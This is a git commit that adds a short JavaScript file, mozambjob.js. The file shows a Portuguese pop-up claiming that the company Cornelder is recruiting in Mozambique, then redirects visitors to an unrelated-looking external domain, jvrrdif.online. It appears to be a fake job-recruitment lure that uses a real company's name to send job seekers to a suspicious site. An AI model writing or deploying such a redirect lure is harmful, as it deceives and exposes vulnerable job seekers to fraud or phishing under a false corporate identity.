97c7fdae24d6a5355ab261e11e627c4b846051bb
newetijazz7 <newetijazz7@gmail.com>
2026-01-06 21:11:52 +0100

    Create mozambjob.js

---
+++ mozambjob.js
@@ -0,0 +1,5 @@
+var password = 'Recrutamento Cornelder'
+password=prompt('PERCEBER: A Cornelder está recrutando, clique em OK para se candidatar.','Recrutamento Cornelder');
+if (password != 'Recrutamento Cornelder') {
+location.href='https://www.jvrrdif.online/Cornelder-mz-job';
+}
